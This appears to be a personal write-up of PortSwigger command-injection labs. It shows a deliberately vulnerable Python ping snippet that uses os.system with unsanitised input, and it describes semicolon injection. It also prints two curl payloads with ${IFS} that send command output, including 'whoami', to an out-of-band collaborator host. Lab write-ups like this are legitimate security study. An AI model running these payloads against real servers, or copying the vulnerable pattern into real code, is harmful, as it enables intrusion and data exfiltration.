### Command injection(Portswigger labs)

### Command Injection vulnerability in web apps 
   
   Command injection occurs when an attacker is able to execute shell commands(operating system commands) on a server.This vulnerability can compromise sensitive data and also help to grant access too an infrastructure.Below is an example of a vulnerable code snippet
   A website can decide to use the Linux ping utility to allow website visitors to ping ip addresses e.g
        
        import os

        ipaddr = input('Enter your ip address')
        result = os.system(f"ping {ipaddr}")
        print(result)
  
  If the user input is not properly sanitized,an attacker can close the first statement with a semi-colon(if linux) and execute another statement.
  
### Challenge 1: Os command injection simple case
Challenge description:

![2023-10-22_16-05](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1a21ffc3-3e04-46d1-bb0c-682749281f3d)

- I intercepted the check stock feature with burp proxy 

![2023-10-22_16-16](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/dbd5496c-ea1a-43d8-b108-6201643e3351)

- I tested both fields with linux shell command but It did not return any output.So I used semi-colon before the commands and it worked.
     
![2023-10-22_16-14](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/cd3e5497-c800-480d-bab8-e5bafd9bd7a3)

- Challenge solved

 ![2023-10-22_16-17](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9a4035f0-62b1-41f2-b186-c1dfb8ce43c8)

### Challenge 2:
Challenge 2 description: Blind command injection with out of band exfiltration

 ![2023-10-24_14-12](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/dbec0d6a-ba94-4377-a8fc-f7bed033e85f)

- The main goal of this challenge is to exploit blind command injection by exfiltrating command output with the aid of burp collaborator.I intercepted the feedback form with burp proxy.

 ![2023-10-24_14-31](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/37093ea4-afa0-499e-afcc-f75610fc3d23)

- After sending to the repeater,I decided to test if the linux utilities that I need are filtered or if some commands are filtered.The first thing I did was making a request to burp collaborator with curl and I noticed that the string 'curl' was not filtered by the website.
- I used this payload to send a request to burp collaborator with a message saying "sleep".Note that ${IFS} means space in bash

      ;curl${IFS}<burp collaborator's link>${IFS}-d${IFS}'sleep'
- The server made a request to burp collaborator containing "sleep" in the body.

  ![2023-10-24_14-49](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3df3fac5-8e45-4b4e-8e2c-e2db12d8dbd0)

- I exfiltrated the current user account with this payload.The payload pipes the result of 'whoami' to the position of @- and curl makes a request containing the data to burp collabortor.

      ;whoami${IFS}|curl${IFS}<burp collaborator's link>${IFS}-d${IFS}@-${IFS}2>/dev/null
- Burp collaborator received a request containing the current user account.

 ![2023-10-24_14-49](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/ebbce3fd-b83d-47fd-be84-294500b5aa60)

- Challenge solved

### Challenge 3:

Challenge 3's description: Blind command injection with out-of-band interaction

 ![2023-10-24_15-08](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d3bf9ad4-7537-4243-aa13-66e7b422dcaa)

-  

 ### Challenge 3:
Challenge description:
